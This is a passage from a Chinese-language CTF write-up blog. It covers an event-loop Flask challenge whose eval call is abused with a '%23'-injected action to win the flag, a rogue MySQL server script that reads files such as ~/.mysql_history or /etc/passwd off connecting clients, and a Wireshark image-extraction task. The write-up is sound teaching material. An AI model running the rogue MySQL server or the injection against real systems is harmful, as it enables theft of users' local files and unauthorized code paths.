</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#75715e"># trigger_event%23;get_flag</span>
</span></span><span style="display:flex;"><span>              <span style="color:#75715e"># 这个地方有意思，%23也就是井号是在拼接之后在eval的时候才触发的，而不是在拼接的时候立刻触发。而从下面来看，似乎井号的触发范围也封装在了event_handle里面了，而不会影响范围外的执行。</span>
</span></span><span style="display:flex;"><span>              event_handler <span style="color:#f92672">=</span> eval(action <span style="color:#f92672">+</span> (<span style="color:#e6db74">&#39;_handler&#39;</span> <span style="color:#66d9ef">if</span> is_action <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;_function&#39;</span>))
</span></span><span style="display:flex;"><span>              ret_val <span style="color:#f92672">=</span> event_handler(args)
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">except</span> RollBackException:
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> resp <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>: resp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>              resp <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;ERROR! All transactions have been cancelled. &lt;br /&gt;&#39;</span>
</span></span><span style="display:flex;"><span>              resp <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:view;index&#34;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span style="display:flex;"><span>              session[<span style="color:#e6db74">&#39;num_items&#39;</span>] <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>prev_session[<span style="color:#e6db74">&#39;num_items&#39;</span>]
</span></span><span style="display:flex;"><span>              session[<span style="color:#e6db74">&#39;points&#39;</span>] <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>prev_session[<span style="color:#e6db74">&#39;points&#39;</span>]
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>, e:
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> resp <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>: resp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>              <span style="color:#75715e">#resp += str(e) # only for debugging</span>
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ret_val <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> resp <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>: resp <span style="color:#f92672">=</span> ret_val
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">else</span>: resp <span style="color:#f92672">+=</span> ret_val
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> resp <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span> resp <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span>: resp <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;404 NOT FOUND&#39;</span>, <span style="color:#ae81ff">404</span>)
</span></span><span style="display:flex;"><span>  session<span style="color:#f92672">.</span>modified <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> resp
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(url_prefix<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">entry_point</span>():
</span></span><span style="display:flex;"><span>  querystring <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>unquote(request<span style="color:#f92672">.</span>query_string)
</span></span><span style="display:flex;"><span>  request<span style="color:#f92672">.</span>event_queue <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> querystring <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">or</span> (<span style="color:#f92672">not</span> querystring<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;action:&#39;</span>)) <span style="color:#f92672">or</span> len(querystring) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span>:
</span></span><span style="display:flex;"><span>      querystring <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;action:index;False#False&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;num_items&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> session:
</span></span><span style="display:flex;"><span>      session[<span style="color:#e6db74">&#39;num_items&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>      session[<span style="color:#e6db74">&#39;points&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>      session[<span style="color:#e6db74">&#39;log&#39;</span>] <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>  request<span style="color:#f92672">.</span>prev_session <span style="color:#f92672">=</span> dict(session)
</span></span><span style="display:flex;"><span>  trigger_event(querystring)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> execute_event_loop()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># handlers/functions below --------------------------------------</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view_handler</span>(args):
</span></span><span style="display:flex;"><span>  page <span style="color:#f92672">=</span> args[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>  html <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>  html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;[INFO] you have </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> diamonds, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> points now.&lt;br /&gt;&#39;</span><span style="color:#f92672">.</span>format(session[<span style="color:#e6db74">&#39;num_items&#39;</span>], session[<span style="color:#e6db74">&#39;points&#39;</span>])
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> page <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;index&#39;</span>:
</span></span><span style="display:flex;"><span>      html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:index;True</span><span style="color:#e6db74">%23F</span><span style="color:#e6db74">alse&#34;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span style="display:flex;"><span>      html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:view;shop&#34;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span style="display:flex;"><span>      html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:view;reset&#34;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">elif</span> page <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;shop&#39;</span>:
</span></span><span style="display:flex;"><span>      html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:buy;1&#34;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">elif</span> page <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;reset&#39;</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">del</span> session[<span style="color:#e6db74">&#39;num_items&#39;</span>]
</span></span><span style="display:flex;"><span>      html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Session reset.&lt;br /&gt;&#39;</span>
</span></span><span style="display:flex;"><span>  html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:view;index&#34;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> html
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index_handler</span>(args):
</span></span><span style="display:flex;"><span>  bool_show_source <span style="color:#f92672">=</span> str(args[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>  bool_download_source <span style="color:#f92672">=</span> str(args[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> bool_show_source <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;True&#39;</span>:
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>      source <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;eventLoop.py&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)
</span></span><span style="display:flex;"><span>      html <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> bool_download_source <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;True&#39;</span>:
</span></span><span style="display:flex;"><span>          html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:index;True%23True&#34;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span style="display:flex;"><span>          html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:view;index&#34;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span style="display:flex;"><span>          
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> source:
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> bool_download_source <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;True&#39;</span>:
</span></span><span style="display:flex;"><span>              html <span style="color:#f92672">+=</span> line<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&amp;&#39;</span>,<span style="color:#e6db74">&#39;&amp;amp;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&amp;nbsp;&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39; &#39;</span>,<span style="color:#e6db74">&#39;&amp;nbsp;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&lt;&#39;</span>, <span style="color:#e6db74">&#39;&amp;lt;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">&#39;&amp;gt;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&lt;br /&gt;&#39;</span>)
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>              html <span style="color:#f92672">+=</span> line
</span></span><span style="display:flex;"><span>      source<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>      
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> bool_download_source <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;True&#39;</span>:
</span></span><span style="display:flex;"><span>          headers <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>          headers[<span style="color:#e6db74">&#39;Content-Type&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;text/plain&#39;</span>
</span></span><span style="display:flex;"><span>          headers[<span style="color:#e6db74">&#39;Content-Disposition&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;attachment; filename=serve.py&#39;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> Response(html, headers<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> html
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>      trigger_event(<span style="color:#e6db74">&#39;action:view;index&#39;</span>)
</span></span><span style="display:flex;"><span>      
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">buy_handler</span>(args):
</span></span><span style="display:flex;"><span>  num_items <span style="color:#f92672">=</span> int(args[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> num_items <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>: <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;invalid number(</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">) of diamonds to buy&lt;br /&gt;&#39;</span><span style="color:#f92672">.</span>format(args[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>  session[<span style="color:#e6db74">&#39;num_items&#39;</span>] <span style="color:#f92672">+=</span> num_items 
</span></span><span style="display:flex;"><span>  trigger_event([<span style="color:#e6db74">&#39;func:consume_point;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(num_items), <span style="color:#e6db74">&#39;action:view;index&#39;</span>])
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">consume_point_function</span>(args):
</span></span><span style="display:flex;"><span>  point_to_consume <span style="color:#f92672">=</span> int(args[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> session[<span style="color:#e6db74">&#39;points&#39;</span>] <span style="color:#f92672">&lt;</span> point_to_consume: <span style="color:#66d9ef">raise</span> RollBackException()
</span></span><span style="display:flex;"><span>  session[<span style="color:#e6db74">&#39;points&#39;</span>] <span style="color:#f92672">-=</span> point_to_consume
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_flag_function</span>(args):
</span></span><span style="display:flex;"><span>  flag <span style="color:#f92672">=</span> args[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;You naughty boy! ;) &lt;br /&gt;&#39;</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_flag_handler</span>(args):
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> session[<span style="color:#e6db74">&#39;num_items&#39;</span>] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">5</span>:
</span></span><span style="display:flex;"><span>      trigger_event(<span style="color:#e6db74">&#39;func:show_flag;&#39;</span> <span style="color:#f92672">+</span> FLAG()) <span style="color:#75715e"># show_flag_function has been disabled, no worries</span>
</span></span><span style="display:flex;"><span>  trigger_event(<span style="color:#e6db74">&#39;action:view;index&#39;</span>)
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>  app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>) 
</span></span></code></pre></div><p><img loading="lazy" src="https://user-images.githubusercontent.com/40637063/56887796-12dafb80-6aa5-11e9-9181-aae6b45ea0ca.png" alt="Screenshot from 2019-04-29 17-29-27"  />
</p>
<p><img loading="lazy" src="https://user-images.githubusercontent.com/40637063/56887798-140c2880-6aa5-11e9-8fcf-44b7353af4da.png" alt="Screenshot from 2019-04-29 17-28-05"  />
</p>
<p><img loading="lazy" src="https://user-images.githubusercontent.com/40637063/56887802-14a4bf00-6aa5-11e9-853d-48cdb2ae8df4.png" alt="Screenshot from 2019-04-29 17-28-36"  />
</p>
<p>这里有个点有疑问：</p>
<ul>
<li>
<p>为什么<code>get_flag_handle</code>函数可以在没有参数的情况下运行？毕竟他申明的时候是有参数的。</p>
<p>值得注意的是，<code>get_flag_handle</code> 和 <code>buy</code>函数是在<code>consume_point_function</code>执行之前被执行的，这个函数会检查我们是否有足够的钻石，如果没有就回滚。然而，整个流程是通过队列来控制的，这意味着如果我们将<code>buy</code>和<code>get_flag</code>函数插入在<code>consume_point_function</code>前面的话，他们会先执行并获取到<code>flag</code>， 注意到<code>trigger_event</code>会将flag放进<code>log</code>之中去并放在<code>session</code>中显示回来。</p>
</li>
</ul>
<h2 id="mysql弱口令">mysql弱口令<a hidden class="anchor" aria-hidden="true" href="#mysql弱口令">#</a></h2>
<p><img loading="lazy" src="https://user-images.githubusercontent.com/40637063/57570602-6d297400-7436-11e9-9cfe-720761c4b08f.png" alt="QQ截图20190511214737"  />
</p>
<p>客户端访问服务端时，服务端可以向客户端发送请求并且实现任意文件读取。</p>
<p>题目中的脚本目的是检测是否开启了mysql服务，所以可以将回显的东西设置为 <code>result = [{'local_address':&quot;0.0.0.0:3306&quot;,'Process_name':&quot;1234/mysqld&quot;}]</code>，这样就可以绕过客户端的验证了。</p>
<p>然后伪造一个mysql客户端。包括三部分：伪造greeting包，伪造登录成功包，伪造文件响应包。
脚本如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0.0.0.0&#39;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">3306</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>server <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>server<span style="color:#f92672">.</span>bind((host,port))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>server<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># filename = &#39;/etc/passwd&#39;</span>
</span></span><span style="display:flex;"><span>filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;~/.mysql_history&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>greeting <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;5b0000000a352e372e32362d307562756e7475302e31392e30342e31000c0000001c2a785a183c1a6200fff7080200ff811500000000000000000000336b72452b23601d7c206856006d7973716c5f6e61746976655f70617373776f726400&#34;</span><span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;hex&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>login_conf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0700000200000002000000&#34;</span><span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;hex&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 这里的chr值得注意</span>
</span></span><span style="display:flex;"><span>evil_request <span style="color:#f92672">=</span> chr(len(filename) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x01\xfb</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span>filename
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>conn, addr <span style="color:#f92672">=</span> server<span style="color:#f92672">.</span>accept()
</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>send(greeting)
</span></span><span style="display:flex;"><span>print conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">9999</span>)
</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>send(login_conf)
</span></span><span style="display:flex;"><span>print conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">9999</span>)
</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>send(evil_request)
</span></span><span style="display:flex;"><span>print conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">9999</span>)
</span></span></code></pre></div><p>三个发送的东西分别对应如下：</p>
<ul>
<li>
<p>greeting</p>
<p><img loading="lazy" src="https://user-images.githubusercontent.com/40637063/57570552-ebd1e180-7435-11e9-9c95-fed585cdd3a2.png" alt="Screenshot from 2019-05-11 15-31-17"  />
</p>
</li>
<li>
<p>登录通过包</p>
<p><img loading="lazy" src="https://user-images.githubusercontent.com/40637063/57570520-7e25b580-7435-11e9-988e-f68b0f04317e.png" alt="Screenshot from 2019-05-11 15-35-00"  />
</p>
</li>
<li>
<p>文件回显包</p>
<p><img loading="lazy" src="https://user-images.githubusercontent.com/40637063/57570547-d8267b00-7435-11e9-9551-fb9ef384c7fd.png" alt="Screenshot from 2019-05-11 15-49-14"  />
</p>
<p>同时运行经过修改后的<code>agent.py</code>和我们的脚本，同时在题目中填上我们的ip和mysql的端口号，就得到了flag</p>
<p><img loading="lazy" src="https://user-images.githubusercontent.com/40637063/57570617-9944f500-7436-11e9-93c5-11b65904cd31.png" alt="Screenshot from 2019-05-11 16-30-14"  />
</p>
<p>参考 ：
<a href="https://xz.aliyun.com/t/3277">https://xz.aliyun.com/t/3277</a></p>
<p><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a></p>
<p><a href="https://www.anquanke.com/post/id/106488">https://www.anquanke.com/post/id/106488</a></p>
</li>
</ul>
<h2 id="wireshark">wireshark<a hidden class="anchor" aria-hidden="true" href="#wireshark">#</a></h2>
<p>拿到数据包，打开，设置过滤条件<code>http</code>，可以看到这里有图片流量。使用<code>file-&gt;export objects-&gt;http</code>来导出所有可以导出的东西，然后有两个通过16进制编辑器修改得出的图片和一张完整图片。其中，两张图片中有一张无法查看，另一张和完整的那张图片一模一样。或者也可以右击导出图中指定的图片部分数据。</p>
<p><img loading="lazy" src="https://user-images.githubusercontent.com/40637063/57571087-2474b980-743c-11e9-976a-480a59136d09.png" alt="Screenshot from 2019-05-11 22-18-49"  />
{:height 684, :width 766}</p>
<p>在<code>wireshark</code>中追踪TCP流，发现最开始访问了一个图片加密的网站。</p>
<p><img loading="lazy" src="https://user-images.githubusercontent.com/40637063/57571086-23dc2300-743c-11e9-90fc-a068dc33cbfa.png" alt="Screenshot from 2019-05-11 22-22-25"  />
</p>
<p>进入，看起来图片的解密是需要密钥的，那么另一张无法查看的图片可能有我们想要的密钥。修改高宽之后可以查看密钥。进入解密网站解密，并用16进制解密即可。</p>
<p><img loading="lazy" src="https://user-images.githubusercontent.com/40637063/57571120-73225380-743c-11e9-8178-e1f74c83a67a.png" alt="x"  />
</p>
<p><img loading="lazy" src="https://user-images.githubusercontent.com/40637063/57571078-f1322a80-743b-11e9-8ebe-099e2db550f7.png" alt="Screenshot from 2019-05-11 15-24-45"  />
</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="http://blog.dragonbox.top/posts/ctf-google-game/">
    <span class="title">« Prev</span>
    <br>
    <span>Google_Game</span>
  </a>
  <a class="next" href="http://blog.dragonbox.top/posts/sec-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
    <span class="title">Next »</span>
    <br>
    <span>流量分析</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="http://blog.dragonbox.top/">ch3n9w の 超元域</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
